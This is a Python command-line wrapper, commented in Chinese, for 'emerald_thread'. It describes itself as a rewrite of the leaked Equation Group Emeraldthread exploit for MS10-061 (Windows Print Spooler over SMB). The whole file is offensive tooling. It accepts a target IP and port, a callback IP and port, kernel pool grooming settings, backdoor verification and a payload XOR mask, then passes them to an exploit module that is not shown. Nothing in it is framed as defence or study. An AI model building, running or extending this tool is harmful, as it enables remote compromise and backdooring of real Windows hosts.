# -*- coding: utf-8 -*-
"""
emerald_thread — Emeraldthread (MS10-061 Print SMB) 利用。

Python 重写自 `Emeraldthread-3.0.0.exe` (C++/MSVCRT)，位于
`EQGRP_Lost_in_Translation-master/windows/exploits/`。

建立在 nsa_equation/dave 统一协议库之上。
"""

from . import emerald_thread_exp


def emerald_thread_handle(args):
    """Run the Emeraldthread tool."""
    return emerald_thread_exp.run(
        target_ip=args.target_ip,
        target_port=args.target_port,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        groom=args.groom,
        max_attempts=args.max_attempts,
        verify_target=args.verify_target,
        verify_backdoor=args.verify_backdoor,
        network_timeout=args.network_timeout,
        xor_mask=args.xor_mask,
    )


def reg_subparser(subparsers):
    """Register the `emerald_thread` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "emerald_thread",
        help="Emeraldthread (MS10-061 Print SMB) 远程利用",
        description="emerald_thread — Emeraldthread (MS10-061 Print SMB) 远程利用，"
                    "基于 nsa_equation/dave 统一协议库。",
    )
    p.add_argument("target_ip", help="目标 IP")
    p.add_argument("-P", "--target-port", type=int, default=445,
                   help="目标 SMB 端口 (默认 445)")
    p.add_argument("--callback-ip", help="回调 IP")
    p.add_argument("--callback-port", type=int, default=0,
                   help="回调端口")
    p.add_argument("--callback-local-port", type=int, default=0,
                   help="本地回调端口")
    p.add_argument("--groom", type=int, default=400,
                   help="非分页池 groom 分配数 (默认 400)")
    p.add_argument("--max-attempts", type=int, default=10,
                   help="最大尝试次数 (默认 10)")
    p.add_argument("--no-verify-target", action="store_true",
                   help="禁用目标验证")
    p.add_argument("--verify-backdoor", action="store_true",
                   help="利用后验证后门")
    p.add_argument("--network-timeout", type=float, default=30.0,
                   help="网络超时")
    p.add_argument("--xor-mask", type=int, default=0,
                   help="EGG XOR mask")
    p.set_defaults(func=emerald_thread_handle)
